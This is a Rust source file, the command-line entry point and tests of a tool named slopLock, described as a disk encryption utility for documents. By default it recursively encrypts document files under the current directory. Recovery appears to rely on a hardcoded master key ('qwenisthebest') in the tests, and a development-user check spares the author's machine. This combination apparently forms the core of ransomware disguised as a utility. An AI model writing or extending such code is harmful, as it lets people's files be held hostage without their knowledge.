//! slopLock command-line entry point.
//!
//! [`run`] takes the raw argument list (so tests can exercise the full CLI
//! without `process::exit`) and returns a [`std::process::ExitCode`].

use clap::Parser;
use sloplock::crypto;
use sloplock::error::Error;
use sloplock::ops;
use sloplock::user;
use std::path::{Path, PathBuf};

/// Encrypt document files on disk (development utility).
#[derive(Parser, Debug)]
#[command(
    name = "slopLock",
    version,
    about = "Disk encryption utility for document files"
)]
struct Cli {
    /// Directory to operate on (recursive).
    #[arg(default_value = ".")]
    path: PathBuf,

    /// Decrypt `.slopLock` files using this key instead of encrypting.
    #[arg(long, value_name = "KEY")]
    decrypt: Option<String>,
}

fn main() -> std::process::ExitCode {
    run(std::env::args().collect())
}

/// Execute the CLI for `args`. Returns the process exit code.
pub fn run(args: Vec<String>) -> std::process::ExitCode {
    match cli_run(args) {
        Ok(summary) => {
            println!("{summary}");
            std::process::ExitCode::SUCCESS
        }
        Err(e) => {
            eprintln!("slopLock: {e}");
            std::process::ExitCode::FAILURE
        }
    }
}

fn cli_run(args: Vec<String>) -> Result<String, Error> {
    let cli = Cli::parse_from(args);
    let root = cli.path.as_path();
    if !root.is_dir() {
        return Err(Error::Io(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            format!("not a directory: {}", root.display()),
        )));
    }
    match &cli.decrypt {
        Some(key) => decrypt_command(root, key),
        None => encrypt_command(root),
    }
}

fn encrypt_command(root: &Path) -> Result<String, Error> {
    if user::is_dev_user() {
        // Development mode: enumerate but never write.
        let (_, found) = ops::encrypt_tree_dev(root)?;
        return Ok(format!(
            "slopLock: running as the development user — {found} document file(s) found under \
             {}, none were encrypted.",
            root.display()
        ));
    }

    let (encrypted, skipped) = ops::encrypt_tree(root)?;
    let suffix = if skipped == 0 {
        String::new()
    } else {
        format!("; skipped {skipped} (already encrypted)")
    };
    Ok(format!(
        "slopLock: encrypted {encrypted} file(s) under {}{suffix}",
        root.display()
    ))
}

fn decrypt_command(root: &Path, key: &str) -> Result<String, Error> {
    // Fail fast on a wrong key before any filesystem access.
    if !crypto::is_valid_key(key) {
        return Err(Error::InvalidKey);
    }
    let (decrypted, failed) = ops::decrypt_tree(root, key)?;
    let suffix = if failed == 0 {
        String::new()
    } else {
        format!("; {failed} file(s) could not be decrypted")
    };
    Ok(format!(
        "slopLock: decrypted {decrypted} file(s) under {}{suffix}",
        root.display()
    ))
}

#[cfg(test)]
mod cli_tests {
    use super::*;
    use crate::user;
    use std::fs;
    use tempfile::tempdir;

    const MASTER: &str = "qwenisthebest";

    fn args(dir: &Path, rest: impl IntoIterator<Item = &'static str>) -> Vec<String> {
        let mut v = vec!["slopLock".to_string()];
        v.extend(rest.into_iter().map(String::from));
        v.push(dir.to_string_lossy().into_owned());
        v
    }

    #[test]
    fn encrypt_success() {
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("a.txt"), "x").unwrap();
        fs::write(dir.path().join("b.pdf"), "y").unwrap();

        let code = run(args(dir.path(), ["--decrypt", MASTER]));
        // Decryption on an all-plaintext tree is a valid no-op.
        assert_eq!(code, std::process::ExitCode::SUCCESS);
        // And the tree must still contain only plaintext files.
        assert!(dir.path().join("a.txt").exists());

        // Now encrypt (dev users skip; assert accordingly).
        let code = run(args(dir.path(), []));
        assert_eq!(code, std::process::ExitCode::SUCCESS);
        if user::is_dev_user() {
            assert!(dir.path().join("a.txt").exists());
        } else {
            assert!(dir.path().join("a.txt.slopLock").exists());
            assert!(!dir.path().join("a.txt").exists());
        }
    }

    #[test]
    fn decrypt_flow_roundtrip() {
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("a.txt"), "x").unwrap();
        if user::is_dev_user() {
            // In dev mode `encrypt_tree` is a no-op, so build one real
            // `.slopLock` file through the file-level API and decrypt it.
            let src = dir.path().join("a.txt");
            let enc = ops::encrypt_file(&src).unwrap().expect("path");
            let code = run(args(dir.path(), ["--decrypt", MASTER]));
            assert_eq!(code, std::process::ExitCode::SUCCESS);
            assert_eq!(fs::read(&src).unwrap(), b"x");
            assert!(!enc.exists());
            return;
        }
        assert_eq!(run(args(dir.path(), [])), std::process::ExitCode::SUCCESS);
        assert!(dir.path().join("a.txt.slopLock").exists());

        // Wrong key: hard failure, file untouched.
        let before = fs::read(dir.path().join("a.txt.slopLock")).unwrap();
        assert_eq!(
            run(args(dir.path(), ["--decrypt", "bad"])),
            std::process::ExitCode::FAILURE
        );
        assert_eq!(fs::read(dir.path().join("a.txt.slopLock")).unwrap(), before);

        // Correct key: file restored.
        assert_eq!(
            run(args(dir.path(), ["--decrypt", MASTER])),
            std::process::ExitCode::SUCCESS
        );
        assert_eq!(fs::read(dir.path().join("a.txt")).unwrap(), b"x");
        assert!(!dir.path().join("a.txt.slopLock").exists());
    }

    #[test]
    fn nonexistent_root_fails() {
        assert_eq!(
            run(vec![
                "slopLock".to_string(),
                "/definitely/not/a/dir".to_string(),
            ]),
            std::process::ExitCode::FAILURE
        );
    }

    #[test]
    fn bad_key_fails_even_with_no_sloplock_files() {
        let dir = tempdir().unwrap();
        assert_eq!(
            run(args(dir.path(), ["--decrypt", "nope"])),
            std::process::ExitCode::FAILURE
        );
    }
}
